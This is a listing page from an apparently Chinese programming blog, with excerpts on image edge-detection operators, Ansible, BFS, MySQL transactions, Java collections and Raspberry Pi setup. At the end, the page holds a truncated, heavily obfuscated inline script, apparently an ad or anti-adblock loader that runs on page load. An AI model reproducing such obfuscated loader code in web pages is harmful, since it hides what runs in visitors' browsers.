{ 1 n ​ } \{\frac{1}{n}​\} {n1​​}
是一个收敛数列，因为当 n n n 趋向于无穷大时， 1 n \frac{1}{n} n1​​ 趋向于0，也就是说，
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bdcca49523bf57e76e1e65cd7490322e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f211702052e7e7e3892416050bcf3917/" rel="bookmark">
			图像处理之sobel算子，Scharr算子,拉普拉斯算子
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图像处理之sobel算子，Scharr算子,拉普拉斯算子 不同算子的卷积核 1.sobel算子 Sobel算子通过将上述模板与图像进行卷积运算来实现边缘检测。对于图像中的每个像素，将Sobel_x和Sobel_y分别与该像素周围的3x3邻域进行卷积，然后将两个方向的梯度值进行合并，得到该像素的边缘梯度。
以上的Gx与Gy分别提取水平梯度和垂直梯度。
2.Scharr算子 Scharr算子类似于Sobel算子，但在计算梯度时具有更高的灵敏度。Scharr算子与Sobel算子一样，也有水平和垂直两个方向，分别称为Scharr_x和Scharr_y。
以上的Gx与Gy分别提取水平梯度和垂直梯度。
与Sobel算子相比，Scharr算子的权值更大，这使得它对图像中边缘的响应更为敏感。因此，Scharr算子在一些情况下可以提供比Sobel算子更好的边缘检测效果。
Scharr算子的原理和Sobel算子类似，它也通过将上述模板与图像进行卷积运算来计算每个像素点的梯度值，并利用梯度值来找到图像中的边缘。在边缘检测中，Scharr算子通常可以产生更细致和更准确的边缘检测结果。
在实际应用中，选择使用Sobel算子还是Scharr算子取决于具体的图像处理任务和对边缘检测的要求。如果需要更敏感和准确的边缘检测，可以考虑使用Scharr算子；如果希望算法计算较简单或计算资源有限，Sobel算子可能是更合适的选择。
3.拉普拉斯算子 拉普拉斯算子用于图像的边缘检测和图像增强。它可以帮助我们找到图像中的边缘、角点和纹理等特征。
以上3x3的矩阵，称为拉普拉斯模板。它可以对图像进行离散卷积，计算出每个像素点与其周围邻域的差异，从而提取出图像中的高频信息，即边缘和纹理等细节。
拉普拉斯算子的原理是通过计算像素点的二阶导数来寻找图像中的变化。一阶导数可以帮助我们找到边缘，而二阶导数则可以帮助我们找到边缘的交叉点，即角点。拉普拉斯算子在图像中检测出的边缘通常比Sobel和Scharr算子更细，但也更容易受到噪声的干扰。
在实际应用中，拉普拉斯算子通常结合阈值处理来进行边缘检测。边缘点的灰度值会在图像上表现为明显的亮度变化，因此可以通过设置阈值来确定哪些像素点被认为是边缘。阈值处理后，可以得到一个二值图像，其中边缘点被表示为白色，背景为黑色。
由于拉普拉斯算子对噪声比较敏感，因此在实际应用中，通常会进行预处理，如平滑滤波，以减少噪声对边缘检测的影响。常见的预处理方法包括高斯模糊和中值滤波等。
使用opencv实现三种算子代码 import cv2 import numpy as np import matplotlib.pyplot as plt # 定义卷积核 Sobel_x = np.array([[-1, 0, 1], [-2, 0, 2], [-1, 0, 1]]) Sobel_y = np.array([[-1, -2, -1], [0, 0, 0], [1, 2, 1]]) Scharr_x = np.array([[-3, 0, 3], [-10, 0, 10], [-3, 0, 3]]) Scharr_y = np.array([[-3, -10, -3], [0, 0, 0], [3, 10, 3]]) Laplacian = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f211702052e7e7e3892416050bcf3917/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b89f3af084a18e9300fdc4a84546e90/" rel="bookmark">
			Ansible安装部署与应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、ansible简介二、ansible 环境安装部署三、ansible 命令行模块3.1 command 模块3.2 shell 模块3.3 cron 模块3.4 user 模块3.5 group 模块3.6 copy 模块3.7 file 模块3.8 hostname 模块3.9 ping 模块3.10 yum 模块3.11 service/systemd 模块3.12 script 模块3.13 mount 模块3.14 archive 模块3.15 unarchive 模块3.16 replace 模块3.17 setup 模块 四、inventory 主机清单 一、ansible简介 Ansible是一个基于Python开发的配置管理和应用部署工具，现在也在自动化管理领域大放异彩。它融合了众多老牌运维工具的优点，Pubbet和Saltstack能实现的功能，Ansible基本上都可以实现。
Ansible能批量配置、部署、管理上千台主机。比如以前需要切换到每个主机上执行的一或多个操作，使用Ansible只需在固定的一台Ansible控制节点上去完成所有主机的操作。
Ansible是基于模块工作的，它只是提供了一种运行框架，它本身没有完成任务的能力，真正执行操作的是Ansible的模块， 比如copy模块用于拷贝文件到远程主机上，service模块用于管理服务的启动、停止、重启等。
Ansible其中一个比较鲜明的特性是Agentless，即无Agent的存在，它就像普通命令一样，并非C/S软件，也只需在某个作为控制节点的主机上安装一次Ansible即可，通常它基于ssh连接来控制远程主机，远程主机上不需要安装Ansible或其它额外的服务。
使用者在使用时，在服务器终端输入命令或者playbooks，会通过预定好的规则将playbook拆解为play，再组织成ansible可以识别的任务，调用模块和插件，根据主机清单通过SSH将临时文件发给远程的客户端执行并返回结果，执行结束后自动删除
Ansible的另一个比较鲜明的特性是它的绝大多数模块都具备幂等性(idempotence)。所谓幂等性，指的是无论执行多少次同样的运算，结果都是相同的，即一条命令，任意多次执行所产生的影响均与一次执行的影响相同。比如执行 systemctl stop xxx 命令来停止服务，当发现要停止的目标服务已经处于停止状态，它什么也不会做， 所以多次停止的结果仍然是停止，不会改变结果，它是幂等的，而 systemctl restart xxx 是非幂等的。
Ansible的很多模块在执行时都会先判断目标节点是否要执行任务，所以，可以放心大胆地让Ansible去执行任务，重复执行某个任务绝大多数时候不会产生任何副作用。
ansible是一个自动化运维工具（机器管理工具）可以实现批量管理堕胎主机，应用级别的快主机编排工具
特性：
无agent的存在，不需要在被控制的节点上安装客户端应用通过ssh协议与被控制的节点上安装客户端应用基于模块工作的，可以通过模块实现在被控制节点上执行命令操作很多模块具有幂等性，可以实现多次模块操作的状态如果没有发送改变，则不会重复执行 二、ansible 环境安装部署 管理端：192.168.44.100 ansible
被管理端：192.168.44.101
被管理端：192.168.44.102
//管理端安装 ansible
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b89f3af084a18e9300fdc4a84546e90/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77c37019390d9112ce0118e91dc118b7/" rel="bookmark">
			BFS广度优先搜索
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、BFS的概念BFS的定义BFS的搜索方式BFS的特点 二、BFS的实战应用1.走迷宫代码实现扩展 2.升级版走迷宫（边的权值不同）思路代码实现扩展 3.八数码代码实现 一、BFS的概念 BFS的定义 BFS（Breadth-First Search）广度优先搜索，是一种图搜索算法，用于在图或树等数据结构中遍历或搜索节点。
BFS的搜索方式 BFS从起始节点开始，逐层地访问其相邻节点，直到找到目标节点或遍历完所有节点。
BFS的工作原理是先访问起始节点，然后按照距离起始节点的距离进行遍历。具体过程如下：
将起始节点标记为已访问，并将其加入一个队列中。从队列中取出一个节点，访问该节点并进行相应处理。将该节点的未访问的相邻节点加入队列，并标记为已访问。重复步骤2和步骤3，直到队列为空。 BFS的特点 BFS的特点是先访问距离起始节点近的节点，然后逐渐向离起始节点更远的节点进行扩展。因此，当在图中搜索最短路径或寻找最近邻节点时，BFS是一种常用的算法。
需要注意的是，BFS使用队列来存储待访问的节点，因此它是一种先进先出（First-In-First-Out，FIFO）的算法。此外，为了避免重复访问节点，需要使用一个标记数组或哈希表来记录节点的访问状态。
一般来说当图的边权都为1时使用BFS，边权为1表示从一个节点到相邻节点的距离或代价是相等的，这意味着每个相邻节点离起始节点的距离相差一个单位。在这种情况下，BFS可以确保首次到达目标节点时的路径长度最小。
如果图中存在边权不为1的情况，BFS可能无法得到最短路径。 对于带有不同边权的图，更适合使用Dijkstra算法或A*算法等其他路径搜索算法，它们可以考虑不同边权的影响，找到最优路径。
二、BFS的实战应用 1.走迷宫 题目描述：
给定一个 n × m n×m n×m 的二维整数数组，用来表示一个迷宫，数组中只包含 0 0 0 或 1 1 1，其中 0 0 0 表示可以走的路， 1 1 1 表示不可通过的墙壁。
最初，有一个人位于左上角 ( 1 , 1 ) (1,1) (1,1) 处，已知该人每次可以向上、下、左、右任意一个方向移动一个位置。
请问，该人从左上角移动至右下角 ( n , m ) (n,m) (n,m) 处，至少需要移动多少次。
数据保证 ( 1 , 1 ) (1,1) (1,1) 处和 ( n , m ) (n,m) (n,m) 处的数字为 0 0 0，且一定至少存在一条通路。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/77c37019390d9112ce0118e91dc118b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c40f0ec7aa5c25d40cb8aa48a90431a/" rel="bookmark">
			GCNV2_SLAM 环境配置 Ubuntu18.04
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		推荐配置：
cuda10.0
eigen3.1.0(不对的话 g2o编译一直报错)
cudnn7.6.2
libtorch1.0.1
参考博客：
GCNv2编译过程中出现的问题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e821fb16f16a3e2820e7c8912f8fed83/" rel="bookmark">
			Android13导入OpenCV4.8流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网上看了很多流程都不能正常导入OpenCV，有一堆报错，而且还有限制，我记一下我的处理方式
首先这个博客主要解决以下问题
1、不需要项目选择native C++，使用最新的OpenCV库
2、不用复制文件，不需要手动改动项目自身的build.gradle，大部分由AS完成
3、解决遇到的namespace问题、找不到Enginne的问题、找不到buildConfig的问题、运行时找不到库的问题
流程如下：
一、下载opencv4.8，正常的创建一个项目
导入Opencv4.8
把opencv的文件解压，导入选择OpenCV-android-sdk/sdk
命名module name
点finish后，出现导入报错，并且显示opencv的build.gradle
删除Kotlin这一行
增加namespace "org.opencv"
修改目标版本与你的项目一致
修改后重试
opencv的build.gradle导入完成 但是点编译会报错，看报错是找不到OpencvEngineInterface和BuildConifg
上面的原因是默认编译的时候没带aidl和buildConfig
回到opencv的build.gradle加上buildFeatures
编译可以通过了
给你自己的项目加上opencv库
然后就可以编程了，如果对C++下的opencv函数熟悉，可以上下面这个链接找对应的函数在哪个类里面
Overview (OpenCV 4.8.0 Java documentation)
简单写了一个程序，运行时发现Mat都new不出来，报错是库找不到
需要在app启动时加上OpenCVLoader.initDebug()，这样就正常了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22d925d6123c49d07559170ce6f55b76/" rel="bookmark">
			将自己的前端项目 在别人的电脑上 测试运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 找到mac上的ip地址 在系统设置--网络--链接的wifi 点击出来 2. 两台电脑的wifi需要是一直的
3. 加上自己前端项目的端口号 比如： http://192.168.57.234:8083 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f10cb0029a1c137cc1bcc09523f434a/" rel="bookmark">
			Cannot read properties of null (reading ‘parentNode‘) TypeError: Cannot read
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在声明reactive数据时，axios获取到的数据一般是对象，需要转为数组才能使用，
我是直接声明
let stuData = reactive({ }) 问题就出在这里
应该是
let stuData = reactive({
data: []
})
自学太难了，容易踩坑，菜鸡QAQ
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebdfe466fd622f5cf9dca69fa347528f/" rel="bookmark">
			回文链表的四种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对回文链表的思考 相比大家对回文数，再熟悉不过了，那么自然也对回文链表也是熟悉，就是通过链表这一数据结构存储数据的回文链表。
今天我将从四个方法来解决这道很简单的题目，并逐步优化性能。
原题传送门leetcode27
方法一 根据回文的性质(从右往左和从左往右数字的顺序都是一样的)，我们不难想到可以使用数据结构中的栈，其具有先进后出的特性，来判断是否是回文链表。
步骤：
将原链表的数据全部压入栈中，然后通过遍历和出栈的元素进行比较是否相等，如果不相等直接等于FALSE，判断其不是回文链表 public boolean isPalindrome(ListNode head) { // 使用栈 Stack &lt;Integer&gt; stack = new Stack&lt;&gt;(); ListNode cur=head; while(cur!=null){ stack.push(cur.val); cur=cur.next; } ListNode pNode=head; while(pNode!=null){ if(pNode.val!=stack.pop()){ return false; } pNode=pNode.next; } return true; } 不足：
通过两次遍历了整块的链表，那么我们能否可以只需要一次完整地遍历整个回文链表，而解决这道题呢？这就需要引出我们的第二种方法。 方法二 分析
因为回文链表是左右各一半是一样的，所以我们可以使用双指针去解决这问题，让fast指针指向到链尾，而slow指针指向链中，同时借助stack出栈一半，既可以检测是否是回文链表了。 public boolean isPalindrome(ListNode head) { // 使用栈 同时结合双指针 Stack &lt;Integer&gt; stack = new Stack&lt;&gt;(); ListNode fast = head; ListNode slow = head; // 零个数字 或者 一个数字 if(head==null || head.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ebdfe466fd622f5cf9dca69fa347528f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4d798970ba023676d50aca59e0eab43/" rel="bookmark">
			java执行ffmpeg命名的Docker镜像制作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天来记录一下通过Dockerfile制作docker镜像的过程
背景 我需要通过java服务调用ffmpeg去执行视频合并的功能，想把这个环境封装到docker镜像当中，方便以后迁移部署。
实现方法 随便找一个路径创建一个Dockerfile文件
touch Dockerfile vim Dockerfile 写入一下内容即可
FROM openjdk:8 MAINTAINER yueyue "123456@qq.com" ENV REFRESHED_AT 2023-07-27 RUN apt update &amp;&amp; apt -y install ffmpeg 上面的意思就是 在jdk8镜像的基础上执行一下安装ffmpeg的命令
接下来就是执行dockerfile构建镜像，一定要注意最后有点
docker build -t openjdk_ffmpeg:8 . 然后执行docker images 就能看到镜像了
搞定！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0fc7538956d9fbc707b603c467de71a/" rel="bookmark">
			MySQL事务及隔离级别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们的数据库一般都会并发执行多个事务，多个事务可能会并发的对相同的一批数据进行增删改查操作，可能就会导致我们说的脏写、脏读、不可重复读、幻读这些问题。
这些问题的本质都是数据库的多事务并发问题，为了解决多事务并发问题，数据库设计了事务隔离机制、锁机制、MVCC多版本并发控制隔离机制，用一整套机制来解决多事务并发问题。
事务及其ACID属性 事务是数据库管理系统中的一个重要概念，用于管理对数据库的访问和操作。它是一组被视为单个逻辑工作单元的数据库操作，这些操作要么全部成功执行，要么全部回滚（撤销），以保证数据的一致性和完整性。
ACID是事务的四个关键属性，它们分别是：
原子性（Atomicity）：事务被视为一个不可分割的原子单元，要么全部执行成功，要么全部回滚。如果在事务执行过程中发生错误，所有的修改将被撤销，数据库回滚到事务开始之前的状态，保持数据的一致性。
一致性（Consistency）：事务执行前后，数据库从一个合法的状态转换到另一个合法的状态，不会破坏数据库的完整性约束。换句话说，事务执行后，数据库应该满足所有定义的完整性规则。
隔离性（Isolation）：事务的隔离性确保多个并发事务之间互相不干扰，即每个事务都感觉不到其他事务的存在。这样可以避免并发操作导致的数据不一致性问题，比如脏读、不可重复读和幻读等。
持久性（Durability）：一旦事务提交，其所做的修改将永久保存在数据库中，即使在系统故障或崩溃后，数据也不会丢失。数据库保证事务的持久性，确保数据的安全性和可靠性。
ACID属性保证了事务的可靠性和稳定性，使得数据库能够处理复杂的并发操作和故障恢复，确保数据始终处于一致的状态。但是，ACID属性也会对数据库性能产生一定的影响，因此在实际应用中，需要根据业务需求和性能要求来权衡是否需要严格的ACID特性。
MySQL并发事务的问题 MySQL并发事务可能会引发以下问题：
脏读（Dirty Read）：一个事务读取了另一个未提交事务的数据，如果另一个事务最终回滚，读取到的数据是无效的。
不可重复读（Non-repeatable Read）：一个事务在多次读取同一数据时，得到了不同的结果，因为其他事务在读取之间修改了该数据。
幻读（Phantom Read）：一个事务在读取了某个范围的数据后，另一个事务插入了新的数据行，导致第一个事务在相同条件下再次读取时，出现了新增的“幻影”行。
死锁（Deadlock）：两个或多个事务相互等待对方释放锁，导致所有事务都无法继续执行。
并发性能下降：并发事务可能会导致锁争用，从而降低数据库的并发性能，特别是在使用表级锁的情况下。
为了解决这些问题，可以采取以下措施：
合理选择事务隔离级别：根据业务需求和数据一致性要求，选择合适的事务隔离级别，从而避免脏读、不可重复读和幻读等问题。
使用行级锁：行级锁可以减少锁争用，提高并发性能，尽量避免使用表级锁。
优化事务边界：将事务保持尽可能短，减少死锁的可能性，尽早释放锁资源。
使用乐观锁或悲观锁：通过锁机制来避免丢失更新问题，确保多个事务之间的数据修改不会相互覆盖。
控制并发度：根据硬件性能和应用需求，适当调整并发度，避免过多的并发事务导致性能下降。
MySQL事务隔离级别 MySQL支持四种事务隔离级别，分别是：
读未提交（Read Uncommitted）：最低的隔离级别。一个事务可以读取另一个事务尚未提交的数据，可能会导致脏读、不可重复读和幻读问题。在这个级别下，没有锁机制的实现。
读提交（Read Committed）：每个事务只能读取已经提交的数据，避免了脏读。但是仍可能发生不可重复读和幻读问题。该级别通过记录的当前读取时间戳（read timestamp）实现并发控制。在读取数据时，只能读取已提交的数据，未提交的数据将被忽略。MySQL使用写入锁（write lock）来防止其他事务同时修改同一个数据行。
可重复读（Repeatable Read）：保证在一个事务中多次读取同一数据时，返回的结果是一致的，避免了脏读和不可重复读问题。但是仍可能发生幻读。该级别使用多版本并发控制（MVCC）来实现数据一致性和并发控制。MVCC通过在每个数据行中保留多个版本来支持并发读取和写入。读取操作会根据事务的开始时间戳（start timestamp）来选择合适的数据版本，而写入操作会为新的数据版本分配一个新的时间戳，并在事务提交后生效。
串行化（Serializable）：该级别通过强制所有事务串行执行来实现最高级别的事务隔离。完全避免脏读、不可重复读和幻读。但是效率较低，因为可能会导致大量的锁冲突。MySQL使用了各种类型的锁（如行级锁、表级锁）来确保并发事务之间的互斥性，以避免冲突和数据不一致。
每种级别可能产生的问题举例说明：
假设有两个事务 A 和 B，一个表 users 存储用户信息。
问题：脏读（Dirty Read）
事务 A 在执行更新操作后，但未提交前，事务 B 读取了相同行的数据。事务 A： START TRANSACTION; UPDATE users SET balance = balance - 100 WHERE id = 1; -- 未提交事务 事务 B： START TRANSACTION; SELECT balance FROM users WHERE id = 1; -- 读取到未提交的数据 COMMIT; 问题：不可重复读（Non-Repeatable Read）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0fc7538956d9fbc707b603c467de71a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f94e31394b294bc22bef5398f50e48fc/" rel="bookmark">
			这 18 个JS优化技巧，可以解决 90% 的屎山代码！！！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大厂技术 高级前端 Node进阶
点击上方 程序员成长指北，关注公众号
回复1，加入高级Node交流群
基本功 1. 使用箭头函数简化函数定义 // 传统函数定义 function add(a, b) { return a + b; } // 箭头函数简化 const add = (a, b) =&gt; a + b; 2. 使用解构赋值简化变量声明 // 传统变量声明 const firstName = person.firstName; const lastName = person.lastName; // 解构赋值简化 const { firstName, lastName } = person; 3. 使用模板字面量进行字符串拼接 // 传统字符串拼接 const greeting = 'Hello, ' + name + '!'; // 模板字面量简化 const greeting = `Hello, ${name}!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f94e31394b294bc22bef5398f50e48fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a02dd5dcce0db70ae30a05d78cb4160c/" rel="bookmark">
			集合Collection(List Set Queue)Map(HashMap)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		集合 接口 集合主要是两大接口以及下面衍生的一些接口 接口实现类
Collection List: 存放的元素有序 可重复 ArrayList 底层也是一个Object[]数组
ArrayList和Array数组的区别？
ArrayList只能存引用类型的对象实例，但是数组引用类型和基本数据类型都可以存
ArrayList可以使用泛型，但数组不可以
ArrayList在创建时不必指定大小，之后可以方便地调用add remove get方法进行增删改查，之后可以动态地进行扩容缩容；但数组不一样，数组在创建时必须指定数组大小，并且数组修改和查询方便，但增加和删除很不方便；
ArrayList可以存null吗？可以
**ArrayList和Vector的区别？**都是List的实现类，但ArrayList线程不安全，Vector线程安全
LinkedList 底层是一个链表。并且是双向链表。
LinkedList基本上大家很少用，就连LinkedList的开发者都说I create it but i never use it.
ArrayList和LinkedList有什么区别？ 1、底层存储：ArrayList存的是Object[]数组，是一块连续的存储空间，可以动态扩容；LinkedList存的是双向链表，不是一块连续的存储空间。
2、线程安全：两者都不是线程安全的
3、增删改查时间复杂度：
增：
ArrayList: add(E e)方法默认在数组尾部添加对象，如果没有达到容量限制的话时间复杂度O(1);如果达到了要扩容的，扩容是将元素复制到一个新的数组里去，时间复杂度O(n);
如果是调用public void add(int index , E element)这个方法在指定索引处添加元素，需要将index之后的元素后移，时间复杂度O(n);
LinkedList:
add(E e)默认在链表尾部增加对象，等同于addLast,尾部添加对象只要last.next=e;就好时间复杂度O(1)
addFirst也是时间复杂度O(1),指针来回指两下就行；
add(int index,E element)在指定位置添加元素的话，需要首先遍历链表到index,时间复杂度已经是O(n)了，添加元素就是指针来回指两下的事O(1);
删除：
ArrayList:
最常使用remove(int index)删除指定位置元素，要将index后元素前移以覆盖index位置元素，时间复杂度O(n)
LinkedList:
删除头尾都很容易O(1),删除指定位置要先遍历链表到index处O(n),真正删除只有O(1)
改查：
由于ArrayList实现了RandomAccess接口（标志着这个接口实现类是否可以随机访问结合任意位置元素），而LinkedList没实现RandomAccess接口，所以ArrayList改查的时间复杂度是O(1),而LinkedList时间复杂度是O(n)
Queue 存放的元素有序可重复，是遵循先进先出的队列
Queue只能队尾插入元素add(E e)，队首删除元素remove()，只能获取队首元素element();
Deque是一个双端对列，队首队尾都可以插入删除获取元素
这两都是接口
Set：存放的元素无序不可重复 除了TreeSet有序 HashSet: HashSet的底层是一个HashMap, add(E e)时其实是在调用HashMap的put(e,new Object()),将要加入的对象作为key加入HashMap里
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a02dd5dcce0db70ae30a05d78cb4160c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85ae88dc3577d520fd99ee9a106466c4/" rel="bookmark">
			Date日期类，超详细整理，适合新手入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 第一代日期Date类2. 第二代日期Calendar类3. 第三代日期LocalDateTime类3.1 Instant类 时间戳3.2 其它方法 1. 第一代日期Date类 jdk1.0引入 Diagram类图中的Properties代表(getter、setter)
第一代日期类
包含两个构造器，Date() 和Date(long)；
new Date()： 精确到毫秒；
默认输出格式：Mon Oct 31 14:32:17 JST 2022(星期 月份 日 时分秒 JST 年)
SimpleDateFormat: 格式化和解析日期的具体类，允许进行解析(文本 -&gt; 日期)
常见格式:yyyy年MM月dd日 D HH:mm:ss:SSS(hh代表12小时制、SSS代表毫秒、D今天是这一年的第几天)
new Date(long)：通过指定毫秒数得到时间
new SimpleDateFormat(“yyyy年MM月dd日 HH:mm:ss:SSS”).parse(“2022年10月31日 14:58:22:119”)
可以将格式化的字符串转换成默认日期格式(日期 -&gt; 文本)
s字符串中的日期格式必须和simpleDateFormat括号里的日期格式相同，才可以使用simpleDateFormat.parse(s)
默认日期格式 &lt;-&gt; 自定义日期格式，相互转换
2. 第二代日期Calendar类 Calendar类是一个抽象类（抽象类不能实例化），构造器是私有的，可以通过getInstance() 来获取实例Calendar类提供了大量的方法和静态属性供程序员使用jdk1.1引入 Calendar没有提供对应的格式化类，因此需要自己组合输出日期
3. 第三代日期LocalDateTime类 构造器
jd8引入；LocalDate()输出年月日；LocalTime()输出时分秒；LocalDateTime()输出年月日时分秒； LocalDateTime.now(); 返回当前时间创建DateTimeFormatter类对象进行格式化
3.1 Instant类 时间戳 构造器
Instant.now()静态方法获取表示当前时间戳的对象
将Instant对象 转换成 Date
将Date 转换成Instant对象
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/85ae88dc3577d520fd99ee9a106466c4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4aad1ed55d946fe2848aa4fe5959dd44/" rel="bookmark">
			树莓派4B 从零开始 基础 入门 安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文旨在记录 4B 从零到安装完成并可以作为服务器使用
为何购买树莓派？ 租赁服务器已经1年多了，一直有自己整台服务器的愿望，恰巧最近树莓派进入了视野，所以想着买一个来当服务器
虽然一个 4B 的算力各方面可能比不上 1C 的服务器，但是我可以多放点小任务上去啊，日常需求是没啥问题的，需要注意家用网络 IP 不定，极个别任务可能做不了或者有难度
如何选择 推荐 4B 4G 版本，4B 之前的型号性能当然不强，可以作为技术成熟后深度 DIY 的工具，考虑下来还是挑最新的好。
4B 版本 8G 内存可以说根本打不满，折中一下选择了 4G
必需配件 树莓派 4B 4GB 单板，350元左右，tb（可以点官网下面的经销商，一样的）散热片，必需！！！三片5元左右，5片10元左右，tb，三片就差不多了，可以挑壳子 + 散热片的。风扇看你发热（使用）情况，需要注意噪音问题。一般来说没啥必要，顶掀开被动散热就差不多了外壳，最好有！10元左右，tb，选官方红白 case 那个样子的就可以电源 + type-c 数据线，电源要 5V3A，最近几年的手机充电器都差不多，实测 5V2A 也可以，其他未知tf 卡（sd卡），以前手机上用的那种，读写速度本来就不快，最好是用好点的，我这里用的旧手机里的 三星128G 的，百元左右读卡器，装系统，应该就几块钱，买 tf 卡会送应该网络连接，不多说了，网线或者无线连接，无线需写入配置补充：电源最好也搞一个 15 左右，后续如果外接硬盘可能还要电源。开关机最好用命令，别直接拔电，带开关的电源也会方便一点，不用每次插拔 以上配件为作为服务器运行所必需的，换句话说，不管你拿他来干啥都必须要的
其他配件 micro 转 HDMI 视频线，5元左右，tb。需要注意，笔记本的HDMI只出不进！！！所以插笔记本上是没反应的。没刚需的话就不用了，说实话，开桌面没啥意思，性能又比不上电脑，多此一举ttl 转usb 串口线，5元左右，tb。目前我只知道它可以拿来以命令行方式连接 4B ，其他功能未知，没必要的~ 其他的配件怎么说呢，没了解过，暂时用不上，而且也不便宜。以后再说
配件到手 假设现在你已经收到了所有必需配件并且散热片和外壳已经装好。
要让你的 4B 跑起来，首先需要在 tf 卡上安装（烧录）系统
下载系统镜像（并解压） 推荐：第三方64位系统，极力推荐，Gitee 地址 烧录/安装 可以使用官方的 Raspberry Pi Imager 或者 win32DiskImager，推荐官方，看着舒服点选择本地镜像文件和 tf 卡，写入使用上述推荐的64位第三方系统直接写入就好，推荐仔细阅读文档插卡 准备启动 如果使用网线，那直接插电开启，开启之后找到 4B 的 ip 地址，可以通过路由器管理界面或者 arp -a 命令查看如果使用无线，那需要修改 boot 区配置，重插读卡器，boot 下 修改 wpa_supplicant.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4aad1ed55d946fe2848aa4fe5959dd44/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/108/">«</a>
	<span class="pagination__item pagination__item--current">109/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/110/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new 